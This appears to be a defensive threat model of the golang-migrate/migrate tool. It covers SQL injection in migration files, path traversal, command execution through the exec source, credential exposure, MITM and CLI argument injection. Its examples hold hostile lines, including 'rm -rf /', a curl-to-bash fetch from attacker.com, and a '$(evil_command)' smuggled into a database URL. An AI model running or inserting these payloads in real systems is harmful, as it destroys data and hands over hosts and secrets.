# Attack Surface Analysis for golang-migrate/migrate

## Attack Surface: [Malicious SQL in Migration Files](./attack_surfaces/malicious_sql_in_migration_files.md)

- **Description:** Attackers inject malicious SQL statements within migration files that are subsequently executed by `migrate`.
- **How migrate contributes to the attack surface:** `migrate` is designed to read and execute SQL statements from migration files. It doesn't inherently sanitize or validate the SQL content, relying on the developer to ensure its safety.
- **Example:** A migration file contains `DROP TABLE users;` or `UPDATE accounts SET balance = balance + 1000000 WHERE username = 'attacker';`.
- **Impact:** Data breaches, data manipulation, privilege escalation, denial of service.
- **Risk Severity:** Critical
- **Mitigation Strategies:**
    - **Code Review:** Thoroughly review all migration files before they are applied, especially those generated automatically or by less experienced developers.
    - **Principle of Least Privilege:** Ensure the database user used by `migrate` has the minimum necessary privileges to perform migrations and not broader access to the database.
    - **Static Analysis:** Utilize static analysis tools that can scan migration files for potentially malicious SQL patterns.
    - **Input Sanitization (Limited Applicability):** While direct sanitization of SQL within migration files is complex, ensure any data inserted into migrations via application logic is properly sanitized *before* being included in the migration file generation process.
    - **Immutable Infrastructure:** Deploy migrations from a trusted, immutable source to prevent tampering.

## Attack Surface: [Path Traversal in Migration File Paths](./attack_surfaces/path_traversal_in_migration_file_paths.md)

- **Description:** Attackers manipulate the path to migration files to access and execute arbitrary files on the server.
- **How migrate contributes to the attack surface:** If the application allows user-controlled input to specify the migration directory or individual migration file paths, `migrate` will attempt to load and execute files from the specified location.
- **Example:**  A user provides a migration path like `../../../../evil_script.sh` which `migrate` attempts to interpret as a migration file.
- **Impact:** Remote code execution, information disclosure, modification of sensitive files.
- **Risk Severity:** Critical
- **Mitigation Strategies:**
    - **Avoid User-Controlled Paths:** Do not allow users to directly specify the migration directory or individual migration file paths.
    - **Hardcode or Configure Paths Securely:** Define the migration directory in a secure configuration file or directly in the code, ensuring it points to the intended location.
    - **Path Validation:** If user input for paths is absolutely necessary, implement strict validation to ensure the path stays within the intended migration directory.
    - **Principle of Least Privilege (File System):** Ensure the user running the `migrate` process has minimal file system permissions.

## Attack Surface: [Unintended Execution of External Commands (with `exec` source)](./attack_surfaces/unintended_execution_of_external_commands__with__exec__source_.md)

- **Description:** When using the `exec` migration source, attackers can craft migration files that execute arbitrary system commands.
- **How migrate contributes to the attack surface:** The `exec` source in `migrate` is specifically designed to execute external commands defined within migration files. This inherently introduces the risk of command injection if the content is not carefully controlled.
- **Example:** A migration file contains a command like `!rm -rf /` or `!curl attacker.com/steal_secrets.sh | bash`.
- **Impact:** Full system compromise, data destruction, denial of service.
- **Risk Severity:** Critical
- **Mitigation Strategies:**
    - **Avoid `exec` Source if Possible:**  If the functionality can be achieved through SQL or other means, avoid using the `exec` source altogether.
    - **Strict Control over `exec` Source Content:**  If `exec` is necessary, implement extremely strict controls over the content of migration files using this source. This might involve automated checks or manual review processes.
    - **Principle of Least Privilege (System User):**  Run the `migrate` process under a user account with the absolute minimum necessary system privileges.
    - **Sandboxing/Containerization:**  Execute migrations within a sandboxed environment or container to limit the impact of malicious commands.

## Attack Surface: [Exposure of Database Credentials](./attack_surfaces/exposure_of_database_credentials.md)

- **Description:** Database credentials required by `migrate` are exposed, allowing unauthorized access to the database.
- **How migrate contributes to the attack surface:** `migrate` needs database connection details (username, password, host, port, database name) to function. If these are stored insecurely, they become a target.
- **Example:** Credentials hardcoded in the application code, stored in plain text configuration files, or exposed in environment variables without proper protection.
- **Impact:** Complete database compromise, data breaches, data manipulation.
- **Risk Severity:** Critical
- **Mitigation Strategies:**
    - **Secure Credential Storage:** Use secure methods for storing database credentials, such as:
        - **Environment Variables (with proper restrictions):** Store credentials in environment variables, ensuring access to these variables is tightly controlled.
        - **Secrets Management Systems:** Utilize dedicated secrets management tools (e.g., HashiCorp Vault, AWS Secrets Manager, Azure Key Vault) to securely store and manage credentials.
        - **Configuration Files with Restricted Permissions:** Store credentials in configuration files with highly restrictive file system permissions.
    - **Avoid Hardcoding:** Never hardcode credentials directly in the application code.
    - **Regular Rotation:** Implement a process for regularly rotating database credentials.

## Attack Surface: [Man-in-the-Middle Attacks on Database Connections](./attack_surfaces/man-in-the-middle_attacks_on_database_connections.md)

- **Description:** Attackers intercept communication between `migrate` and the database to steal credentials or manipulate data.
- **How migrate contributes to the attack surface:** `migrate` establishes a connection to the database. If this connection is not encrypted, it's vulnerable to interception.
- **Example:** An attacker intercepts the connection and captures the database username and password being transmitted in plain text.
- **Impact:** Database compromise, data breaches, data manipulation.
- **Risk Severity:** High
- **Mitigation Strategies:**
    - **Use TLS/SSL for Database Connections:** Configure `migrate` to connect to the database using TLS/SSL encryption. This ensures that communication is encrypted and protected from eavesdropping.
    - **Verify Server Certificates:** Ensure that the client (where `migrate` is running) verifies the server's SSL certificate to prevent man-in-the-middle attacks.

## Attack Surface: [Command Injection via CLI Arguments (if applicable)](./attack_surfaces/command_injection_via_cli_arguments__if_applicable_.md)

- **Description:** Attackers inject malicious commands into arguments passed to the `migrate` CLI tool.
- **How migrate contributes to the attack surface:** If the application uses the `migrate` CLI tool and constructs the command using user-provided input without proper sanitization, it becomes vulnerable to command injection.
- **Example:**  The application constructs a command like `migrate -database "postgres://user:pass@host:port/db?search_path=$(evil_command)" up`.
- **Impact:** Remote code execution on the server.
- **Risk Severity:** High
- **Mitigation Strategies:**
    - **Avoid Dynamic CLI Command Construction:** If possible, avoid constructing `migrate` CLI commands dynamically based on user input.
    - **Input Sanitization and Validation:** If dynamic construction is necessary, rigorously sanitize and validate all user-provided input before incorporating it into the CLI command.
    - **Use Programmatic API:** Consider using the `migrate` library's programmatic API instead of the CLI tool to have more control over how migrations are executed.
